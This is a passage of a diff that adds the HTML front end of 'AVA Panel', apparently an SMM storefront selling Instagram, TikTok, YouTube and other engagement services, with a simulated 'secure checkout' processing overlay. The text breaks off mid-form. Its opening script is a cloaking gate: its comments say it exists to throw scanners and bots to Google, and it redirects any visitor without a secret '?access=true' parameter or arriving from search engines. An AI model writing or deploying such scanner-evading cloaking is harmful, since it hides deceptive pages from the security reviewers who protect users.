@@ -1,0 +1,1537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+  (function() {
+    // URL check kar raha hai ke usme '?access=true' likha hai ya nahi
+    const urlParams = new URLSearchParams(window.location.search);
+    const hasAccess = urlParams.get('access');
+
+    // Agar link mein 'access=true' nahi hai, toh matlab wo bot ya direct banda hai
+    if (hasAccess !== 'true') {
+        // Scanners aur bots ko Google par phenk do
+        window.location.href = "https://www.google.com";
+    }
+    
+    // Agar koi google bot referrer ke sath aaye tab bhi block kardo (Extra Safety)
+    var ref = document.referrer.toLowerCase();
+    if (ref.includes("google") || ref.includes("bot") || ref.includes("bing")) {
+        window.location.href = "https://www.google.com";
+    }
+  })();
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AVA Panel — Premium SMM Services</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        inter: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        ava: {
+                            bg: '#0a0a0f',
+                            card: '#12121a',
+                            cardHover: '#161620',
+                            border: '#1e1e2e',
+                            borderLight: '#2a2a3e',
+                            accent: '#6c5ce7',
+                            accentLight: '#a29bfe',
+                            accentDark: '#5a4bd1',
+                            success: '#00cec9',
+                            warning: '#fdcb6e',
+                            danger: '#ff6b6b',
+                            text: '#e2e2e8',
+                            textMuted: '#6b6b80',
+                            textDim: '#45455a',
+                            input: '#0d0d14',
+                            inputBorder: '#252538',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0a0a0f;
+            overflow-x: hidden;
+        }
+
+        .animated-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
+            background: linear-gradient(135deg, #0a0a0f 0%, #0f0f1a 25%, #0a0a0f 50%, #12101f 75%, #0a0a0f 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+        }
+        .animated-bg::before {
+            content: ''; position: absolute; inset: 0;
+            background: radial-gradient(ellipse at 20% 50%, rgba(108,92,231,0.03) 0%, transparent 50%),
+                        radial-gradient(ellipse at 80% 20%, rgba(162,155,254,0.02) 0%, transparent 50%),
+                        radial-gradient(ellipse at 50% 80%, rgba(108,92,231,0.02) 0%, transparent 50%);
+            animation: glowPulse 8s ease-in-out infinite alternate;
+        }
+        .animated-bg::after {
+            content: ''; position: absolute; inset: 0;
+            background: radial-gradient(circle at 30% 70%, rgba(108,92,231,0.04) 0%, transparent 40%),
+                        radial-gradient(circle at 70% 30%, rgba(0,206,201,0.02) 0%, transparent 40%);
+            animation: glowMove 12s ease-in-out infinite alternate-reverse;
+        }
+
+        @keyframes gradientShift { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
+        @keyframes glowPulse { 0%{opacity:.5} 100%{opacity:1} }
+        @keyframes glowMove { 0%{transform:translateX(-10px) translateY(-10px)} 100%{transform:translateX(10px) translateY(10px)} }
+
+        .grid-pattern {
+            position: fixed; inset: 0; z-index: 1; pointer-events: none;
+            background-image: linear-gradient(rgba(108,92,231,0.03) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(108,92,231,0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+        }
+
+        .particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; overflow: hidden; }
+        .particle {
+            position: absolute; width: 2px; height: 2px;
+            background: rgba(108,92,231,0.3); border-radius: 50%;
+            animation: float linear infinite;
+        }
+        .particle:nth-child(1){left:10%;animation-duration:20s;animation-delay:0s}
+        .particle:nth-child(2){left:20%;animation-duration:25s;animation-delay:-5s;width:3px;height:3px}
+        .particle:nth-child(3){left:35%;animation-duration:18s;animation-delay:-3s}
+        .particle:nth-child(4){left:50%;animation-duration:22s;animation-delay:-8s;width:1px;height:1px}
+        .particle:nth-child(5){left:65%;animation-duration:28s;animation-delay:-2s}
+        .particle:nth-child(6){left:75%;animation-duration:19s;animation-delay:-6s}
+        .particle:nth-child(7){left:85%;animation-duration:24s;animation-delay:-4s}
+        .particle:nth-child(8){left:45%;animation-duration:21s;animation-delay:-7s;width:1px;height:1px}
+
+        @keyframes float {
+            0%{transform:translateY(100vh) rotate(0deg);opacity:0}
+            10%{opacity:1} 90%{opacity:1}
+            100%{transform:translateY(-100vh) rotate(720deg);opacity:0}
+        }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0a0f; }
+        ::-webkit-scrollbar-thumb { background: #252538; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #6c5ce7; }
+
+        select {
+            appearance: none; -webkit-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%236b6b80' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat; background-position: right 16px center; padding-right: 40px;
+        }
+        select option { background-color: #12121a; color: #e2e2e8; }
+
+        .input-glow:focus { box-shadow: 0 0 0 3px rgba(108,92,231,0.15), 0 0 20px rgba(108,92,231,0.05); }
+
+        .card-glow { position: relative; }
+        .card-glow::before {
+            content: ''; position: absolute; inset: -1px;
+            background: linear-gradient(135deg, rgba(108,92,231,0.1), transparent, rgba(108,92,231,0.05));
+            border-radius: inherit; z-index: -1; opacity: 0; transition: opacity 0.4s ease;
+        }
+        .card-glow:hover::before { opacity: 1; }
+
+        .btn-shine { position: relative; overflow: hidden; }
+        .btn-shine::after {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: linear-gradient(transparent, rgba(255,255,255,0.03), transparent);
+            transform: rotate(45deg); animation: shine 4s ease-in-out infinite;
+        }
+        @keyframes shine { 0%,100%{transform:translateX(-100%) rotate(45deg)} 50%{transform:translateX(100%) rotate(45deg)} }
+
+        .section-enter { animation: sectionFadeIn 0.5s cubic-bezier(0.4,0,0.2,1) forwards; }
+        .section-exit { animation: sectionFadeOut 0.3s cubic-bezier(0.4,0,0.2,1) forwards; }
+        @keyframes sectionFadeIn { from{opacity:0;transform:translateY(20px) scale(0.98)} to{opacity:1;transform:translateY(0) scale(1)} }
+        @keyframes sectionFadeOut { from{opacity:1;transform:translateY(0) scale(1)} to{opacity:0;transform:translateY(-20px) scale(0.98)} }
+
+        .pulse-ring { animation: pulseRing 2s ease-in-out infinite; }
+        @keyframes pulseRing { 0%,100%{box-shadow:0 0 0 0 rgba(108,92,231,0.2)} 50%{box-shadow:0 0 0 8px rgba(108,92,231,0)} }
+
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type="number"] { -moz-appearance: textfield; }
+
+        .tooltip-container { position: relative; }
+        .tooltip-container .tooltip-text {
+            visibility: hidden; opacity: 0; position: absolute; bottom: calc(100% + 8px);
+            left: 50%; transform: translateX(-50%); background: #1e1e2e; color: #e2e2e8;
+            padding: 6px 12px; border-radius: 6px; font-size: 12px; white-space: nowrap;
+            transition: all 0.2s ease; border: 1px solid #252538; z-index: 50;
+        }
+        .tooltip-container:hover .tooltip-text { visibility: visible; opacity: 1; }
+
+        .status-dot { animation: statusPulse 2s ease-in-out infinite; }
+        @keyframes statusPulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+        .spinner {
+            border: 2px solid rgba(108,92,231,0.1); border-top: 2px solid #6c5ce7;
+            border-radius: 50%; width: 20px; height: 20px; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to{transform:rotate(360deg)} }
+
+        .charge-update { animation: chargeFlash 0.3s ease; }
+        @keyframes chargeFlash { 0%{color:#6c5ce7;transform:scale(1.05)} 100%{color:#e2e2e8;transform:scale(1)} }
+
+        .live-dot {
+            display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+            background: #00cec9; margin-right: 6px; vertical-align: middle;
+            animation: livePulse 1.5s ease-in-out infinite;
+            box-shadow: 0 0 6px rgba(0,206,201,0.5);
+        }
+        @keyframes livePulse {
+            0%,100%{ opacity:1; box-shadow: 0 0 4px rgba(0,206,201,0.4); }
+            50%{ opacity:0.5; box-shadow: 0 0 10px rgba(0,206,201,0.7); }
+        }
+
+        .activity-ticker {
+            position: fixed; bottom: 24px; left: 24px; z-index: 100;
+            transform: translateX(-120%); opacity: 0;
+            transition: all 0.6s cubic-bezier(0.34,1.56,0.64,1);
+        }
+        .activity-ticker.show { transform: translateX(0); opacity: 1; }
+        .activity-ticker.hide { transform: translateX(-120%); opacity: 0; }
+
+        .processing-overlay {
+            position: fixed; inset: 0; z-index: 200;
+            background: rgba(10,10,15,0.92); backdrop-filter: blur(12px);
+            display: flex; align-items: center; justify-content: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.3s ease;
+        }
+        .processing-overlay.active { opacity: 1; pointer-events: auto; }
+
+        .processing-spinner {
+            width: 48px; height: 48px; border-radius: 50%;
+            border: 3px solid rgba(108,92,231,0.15);
+            border-top-color: #6c5ce7;
+            animation: spin 0.9s linear infinite;
+        }
+
+        .processing-bar {
+            width: 220px; height: 3px; background: rgba(108,92,231,0.1);
+            border-radius: 4px; overflow: hidden; margin-top: 20px;
+        }
+        .processing-bar-fill {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, #6c5ce7, #a29bfe, #6c5ce7);
+            background-size: 200% 100%;
+            border-radius: 4px;
+            animation: barFill 2.2s cubic-bezier(0.4,0,0.2,1) forwards, barShimmer 1.5s ease-in-out infinite;
+        }
+        @keyframes barFill { 0%{width:0%} 15%{width:20%} 40%{width:45%} 60%{width:65%} 80%{width:85%} 100%{width:100%} }
+        @keyframes barShimmer { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
+
+        .processing-step { opacity: 0; transform: translateY(8px); transition: all 0.4s ease; }
+        .processing-step.active { opacity: 1; transform: translateY(0); }
+        .processing-step.done { opacity: 0.4; }
+
+        .check-appear { animation: checkPop 0.4s cubic-bezier(0.34,1.56,0.64,1) forwards; }
+        @keyframes checkPop { 0%{transform:scale(0);opacity:0} 100%{transform:scale(1);opacity:1} }
+
+        .nav-link { position: relative; }
+        .nav-link.active { color: #6c5ce7 !important; background: rgba(108,92,231,0.1) !important; }
+        .nav-link:not(.active):hover { color: #e2e2e8 !important; background: rgba(18,18,26,1) !important; }
+
+        .mobile-menu {
+            transform: translateY(-10px); opacity: 0; pointer-events: none;
+            transition: all 0.25s cubic-bezier(0.4,0,0.2,1);
+        }
+        .mobile-menu.open { transform: translateY(0); opacity: 1; pointer-events: auto; }
+
+        .glass-header {
+            background: rgba(10, 10, 15, 0.6);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(108, 92, 231, 0.1);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .price-value { font-weight: 700 !important; letter-spacing: -0.02em; }
+        .price-currency { font-weight: 600; opacity: 0.9; }
+    </style>
+</head>
+<body class="font-inter text-ava-text min-h-screen">
+
+    <!-- Animated Background -->
+    <div class="animated-bg"></div>
+    <div class="grid-pattern"></div>
+    <div class="particles">
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div><div class="particle"></div>
+    </div>
+
+    <!-- Processing Overlay -->
+    <div id="processingOverlay" class="processing-overlay">
+        <div class="text-center">
+            <div class="processing-spinner mx-auto"></div>
+            <div class="processing-bar mt-6 mx-auto">
+                <div class="processing-bar-fill" id="processingBarFill"></div>
+            </div>
+            <div class="mt-6 space-y-3">
+                <div class="processing-step active" id="procStep1">
+                    <div class="flex items-center justify-center gap-2">
+                        <div class="spinner" style="width:14px;height:14px;border-width:2px;" id="procSpinner1"></div>
+                        <span class="text-sm text-ava-textMuted" id="procText1">Validating order details...</span>
+                    </div>
+                </div>
+                <div class="processing-step" id="procStep2">
+                    <div class="flex items-center justify-center gap-2">
+                        <div class="spinner" style="width:14px;height:14px;border-width:2px;opacity:0;" id="procSpinner2"></div>
+                        <span class="text-sm text-ava-textMuted" id="procText2">Checking service availability...</span>
+                    </div>
+                </div>
+                <div class="processing-step" id="procStep3">
+                    <div class="flex items-center justify-center gap-2">
+                        <div class="spinner" style="width:14px;height:14px;border-width:2px;opacity:0;" id="procSpinner3"></div>
+                        <span class="text-sm text-ava-textMuted" id="procText3">Preparing secure checkout...</span>
+                    </div>
+                </div>
+            </div>
+            <p class="text-xs text-ava-textDim mt-6">Please do not close this window</p>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="relative z-10 min-h-screen flex flex-col">
+
+        <!-- Navigation Bar -->
+        <nav class="glass-header sticky top-0 z-50">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex items-center justify-between h-16">
+                    <!-- Logo -->
+                    <div class="flex items-center gap-3 cursor-pointer" onclick="navigateTo('order')">
+                        <div class="relative">
+                            <div class="w-9 h-9 rounded-lg bg-gradient-to-br from-ava-accent to-ava-accentLight flex items-center justify-center pulse-ring">
+                                <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <div>
+                            <h1 class="text-lg font-bold tracking-tight">
+                                <span class="text-white">AVA</span>
+                                <span class="text-ava-accent ml-1">Panel</span>
+                            </h1>
+                        </div>
+                    </div>
+
+                    <!-- Desktop Nav Links -->
+                    <div class="hidden md:flex items-center gap-1">
+                        <button onclick="navigateTo('order')" id="navNewOrder" class="nav-link active px-4 py-2 rounded-lg text-sm font-medium transition-all duration-200">
+                            <span class="flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/>
+                                </svg>
+                                New Order
+                            </span>
+                        </button>
+                        <button onclick="navigateTo('history')" id="navOrders" class="nav-link px-4 py-2 rounded-lg text-sm font-medium text-ava-textMuted transition-all duration-200">
+                            <span class="flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/>
+                                </svg>
+                                Orders
+                            </span>
+                        </button>
+                        <a href="https://wa.me/17787158884" target="_blank" rel="noopener noreferrer" class="nav-link px-4 py-2 rounded-lg text-sm font-medium text-ava-textMuted transition-all duration-200 hover:text-ava-text hover:bg-ava-card">
+                            <span class="flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                                </svg>
+                                Support
+                            </span>
+                        </a>
+                        <button onclick="navigateTo('api')" id="navApi" class="nav-link px-4 py-2 rounded-lg text-sm font-medium text-ava-textMuted transition-all duration-200">
+                            <span class="flex items-center gap-2">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/>
+                                </svg>
+                                API
+                            </span>
+                        </button>
+                    </div>
+
+                    <!-- Right Side - Empty/Clean -->
+                    <div class="flex items-center gap-3">
+                        <!-- Mobile Menu Button Only -->
+                        <button onclick="toggleMobileMenu()" class="md:hidden w-8 h-8 rounded-lg bg-ava-card border border-ava-border flex items-center justify-center" id="mobileMenuBtn">
+                            <svg class="w-4 h-4 text-ava-textMuted" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Mobile Menu Dropdown -->
+            <div id="mobileMenu" class="mobile-menu md:hidden border-t border-ava-border/50 bg-ava-bg/95 backdrop-blur-xl">
+                <div class="px-4 py-3 space-y-1">
+                    <button onclick="navigateTo('order');toggleMobileMenu()" class="w-full text-left px-4 py-2.5 rounded-lg text-sm font-medium text-ava-accent bg-ava-accent/10">
+                        <span class="flex items-center gap-2">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/></svg>
+                            New Order
+                        </span>
+                    </button>
+                    <button onclick="navigateTo('history');toggleMobileMenu()" class="w-full text-left px-4 py-2.5 rounded-lg text-sm font-medium text-ava-textMuted hover:bg-ava-card">
+                        <span class="flex items-center gap-2">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
+                            Orders
+                        </span>
+                    </button>
+                    <a href="https://wa.me/17787158884" target="_blank" rel="noopener noreferrer" class="block px-4 py-2.5 rounded-lg text-sm font-medium text-ava-textMuted hover:bg-ava-card">
+                        <span class="flex items-center gap-2">
+                            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+                            Support (WhatsApp)
+                        </span>
+                    </a>
+                    <button onclick="navigateTo('api');toggleMobileMenu()" class="w-full text-left px-4 py-2.5 rounded-lg text-sm font-medium text-ava-textMuted hover:bg-ava-card">
+                        <span class="flex items-center gap-2">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>
+                            API
+                        </span>
+                    </button>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Page Content -->
+        <main class="flex-1 max-w-4xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
+
+            <!-- Page Header -->
+            <div class="mb-8">
+                <div class="flex items-center gap-2 mb-2">
+                    <div class="w-1 h-5 rounded-full bg-gradient-to-b from-ava-accent to-ava-accentLight"></div>
+                    <h2 class="text-2xl sm:text-3xl font-bold text-white tracking-tight" id="pageTitle">Place New Order</h2>
+                </div>
+                <p class="text-ava-textMuted text-sm ml-3" id="pageSubtitle">Select a service and configure your order details below.</p>
+            </div>
+
+            <!-- Step Indicator -->
+            <div class="mb-8" id="stepIndicatorWrap">
+                <div class="flex items-center gap-4">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-ava-accent flex items-center justify-center text-white text-xs font-bold transition-all duration-300" id="step1Circle">1</div>
+                        <span class="text-sm font-medium text-white transition-all duration-300" id="step1Text">Order Details</span>
+                    </div>
+                    <div class="flex-1 h-px bg-ava-border relative">
+                        <div class="absolute inset-0 bg-gradient-to-r from-ava-accent to-ava-accentLight transition-all duration-500 origin-left" id="stepProgress" style="transform: scaleX(0)"></div>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-ava-card border border-ava-border flex items-center justify-center text-ava-textMuted text-xs font-bold transition-all duration-300" id="step2Circle">2</div>
+                        <span class="text-sm font-medium text-ava-textMuted transition-all duration-300" id="step2Text">Payment</span>
+                    </div>
+                </div>
+            </div>
+
+
+            <!-- ==================== ORDER SECTION ==================== -->
+            <div id="orderSection" class="section-enter">
+                <div class="bg-ava-card/80 backdrop-blur-sm border border-ava-border rounded-2xl overflow-hidden card-glow">
+                    <!-- Card Header -->
+                    <div class="px-6 sm:px-8 py-5 border-b border-ava-border/50">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 rounded-xl bg-ava-accent/10 border border-ava-accent/20 flex items-center justify-center">
+                                    <svg class="w-5 h-5 text-ava-accent" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"/>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <h3 class="text-base font-semibold text-white">Order Configuration</h3>
+                                    <p class="text-xs text-ava-textMuted mt-0.5">Fill in all required fields — pay per order</p>
+                                </div>
+                            </div>
+                            <div class="tooltip-container">
+                                <div class="w-8 h-8 rounded-lg bg-ava-input border border-ava-inputBorder flex items-center justify-center cursor-help">
+                                    <svg class="w-4 h-4 text-ava-textMuted" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                    </svg>
+                                </div>
+                                <span class="tooltip-text">Need help? Chat on WhatsApp</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Card Body -->
+                    <div class="px-6 sm:px-8 py-6 space-y-5">
+                        <!-- Service Category -->
+                        <div class="space-y-2">
+                            <label class="flex items-center gap-1.5 text-sm font-medium text-ava-text">
+                                <svg class="w-3.5 h-3.5 text-ava-textMuted" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/>
+                                </svg>
+                                Service Category
+                                <span class="text-ava-danger">*</span>
+                            </label>
+                            <select id="serviceCategory" class="w-full px-4 py-3 rounded-xl bg-ava-input border border-ava-inputBorder text-ava-text text-sm focus:outline-none focus:border-ava-accent/50 input-glow transition-all duration-200 cursor-pointer">
+                                <option value="" disabled selected>Choose a category...</option>
+                                <option value="instagram">📸 Instagram Services</option>
+                                <option value="tiktok">🎵 TikTok Services</option>
+                                <option value="youtube">🎬 YouTube Services</option>
+                                <option value="twitter">🐦 Twitter / X Services</option>
+                                <option value="telegram">✈️ Telegram Services</option>
+                                <option value="discord">💬 Discord Services</option>
+                                <option value="spotify">🎧 Spotify Services</option>
+                                <option value="facebook">👤 Facebook Services</option>
+                            </select>
+                        </div>
+
+                        <!-- Service -->
+                        <div class="space-y-2">
+                            <label class="flex items-center gap-1.5 text-sm font-medium text-ava-text">
+                                <svg class="w-3.5 h-3.5 text-ava-textMuted" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 3v4M3 5h4M6 17v4m-2-2h4m5-16l2.286 6.857L21 12l-5.714 2.143L13 21l-2.286-6.857L5 12l5.714-2.143L13 3z"/>
+                                </svg>
+                                Service
+                                <span class="text-ava-danger">*</span>
+                            </label>
+                            <select id="serviceSelect" class="w-full px-4 py-3 rounded-xl bg-ava-input border border-ava-inputBorder text-ava-text text-sm focus:outline-none focus:border-ava-accent/50 input-glow transition-all duration-200 cursor-pointer" disabled>
+                                <option value="" disabled selected>Select a category first...</option>
+                            </select>
+                            <!-- Service Info -->
+                            <div id="serviceInfo" class="hidden">
+                                <div class="flex flex-wrap items-center gap-4 mt-2 px-4 py-2.5 rounded-lg bg-ava-accent/5 border border-ava-accent/10">
+                                    <div class="flex items-center gap-1.5">
+                                        <span class="live-dot"></span>
+                                        <span class="text-xs font-semibold text-emerald-400">LIVE</span>
+                                    </div>
+                                    <div class="w-px h-4 bg-ava-border"></div>
+                                    <div class="flex items-center gap-1.5">
+                                        <svg class="w-3.5 h-3.5 text-ava-accent" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/>
+                                        </svg>
+                                        <span class="text-xs text-ava-textMuted">Rate:</span>
+                                        <span class="text-xs font-bold text-ava-accent price-value" id="serviceRate">-</span>
+                                    </div>
+                                    <div class="w-px h-4 bg-ava-border"></div>
+                                    <div class="flex items-center gap-1.5">
+                                        <span class="text-xs text-ava-textMuted">Min:</span>
+                                        <span class="text-xs font-semibold text-ava-text" id="serviceMin">-</span>
+                                    </div>
+                                    <div class="w-px h-4 bg-ava-border"></div>
+                                    <div class="flex items-center gap-1.5">
+                                        <span class="text-xs text-ava-textMuted">Max:</span>
+                                        <span class="text-xs font-semibold text-ava-text" id="serviceMax">-</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Link -->
+                        <div class="space-y-2">
+                            <label class="flex items-center gap-1.5 text-sm font-medium text-ava-text">
+                                <svg class="w-3.5 h-3.5 text-ava-textMuted" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"/>
+                                </svg>
+                                Link
+                                <span class="text-ava-danger">*</span>
+                            </label>
+                            <div class="relative">
+                                <div class="absolute left-4 top-1/2 -translate-y-1/2">
+                                    <svg class="w-4 h-4 text-ava-textDim" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/>
+                                    </svg>
+                                </div>
+                                <input type="url" id="linkInput" placeholder="https://instagram.com/p/example..." class="w-full pl-11 pr-4 py-3 rounded-xl bg-ava-input border border-ava-inputBorder text-ava-text text-sm placeholder:text-ava-textDim focus:outline-none focus:border-ava-accent/50 input-glow transition-all duration-200">
+                            </div>
+                        </div>
+
+                        <!-- Quantity -->
+                        <div class="space-y-2">
